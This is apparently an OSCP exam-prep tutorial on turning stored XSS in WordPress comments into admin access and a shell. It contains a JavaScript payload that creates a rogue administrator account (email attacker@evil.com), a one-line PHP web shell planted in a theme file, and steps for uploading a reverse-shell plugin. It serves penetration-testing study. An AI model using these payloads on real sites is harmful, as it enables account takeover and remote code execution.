### The WordPress XSS Attack Chain

In this scenario, the OSCP machine simulates an "admin bot" that checks the site periodically (e.g., viewing pending comments every 60 seconds).

**1. The Injection (Stored XSS)** You find a vulnerable input field—usually a blog comment, a contact form, or a forum post—and inject a malicious JavaScript payload.

**2. The Trigger** The automated backend admin bot logs into WordPress and reviews the comments page. When the admin's browser loads your comment, your JavaScript payload executes silently inside their authenticated session.

**3. The Escalation Payload (What the JS actually does)** Instead of popping an `alert(1)` or trying to steal a cookie (which fails if the `HttpOnly` flag is set), your JavaScript forces the admin's browser to make a background `POST` request to the WordPress user creation endpoint.

Because the request comes from the admin's browser, WordPress sees the admin's valid session cookie and accepts it. The payload automatically creates a new user account (e.g., `attacker / password123`) and assigns it the **Administrator** role.

### Conceptual JavaScript Payload (Adding a WP Admin)

You don't need to write this from scratch on the exam—there are standard PoCs for this. But conceptually, the payload looks like this:

JavaScript

```
// A script injected into a comment that forces the Admin to create a new user
<script>
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var params = "action=createuser&_wpnonce_create-user=[nonce]&user_login=attacker&email=attacker@evil.com&pass1=password123&pass2=password123&role=administrator";

ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
</script>
```

_(Note: Modern WordPress uses CSRF nonces, so a real exploit script first fetches the page to extract the admin's nonce, then sends the POST request.)_

### From WP Admin to Reverse Shell (The Finish Line)

Once your XSS payload fires and creates your rogue admin account, you log into `http://<IP>/wp-login.php`. From there, getting a shell takes 60 seconds:

**Option A: Theme Editing (Fastest)**

1. Go to **Appearance > Theme Editor**.
    
2. Select a file that isn't actively used, like `404.php`.
    
3. Overwrite the contents with a PHP web shell: `<?php system($_GET['cmd']); ?>`
    
4. Save, then navigate to: `http://<IP>/wp-content/themes/<theme_name>/404.php?cmd=id`
    

**Option B: Malicious Plugin**

1. Zip a PHP reverse shell script.
    
2. Go to **Plugins > Add New > Upload Plugin**.
    
3. Upload the zip and activate it. The shell triggers immediately.
    

### The OSCP Triage Rule for WordPress XSS

If you see a WordPress site on the exam and you cannot find a vulnerable plugin for immediate RCE, look for a place to submit text. If you can submit a comment and there is any indication that an admin reviews them (e.g., _"Your comment is awaiting moderation"_), **Stored XSS is your intended path to initial access.**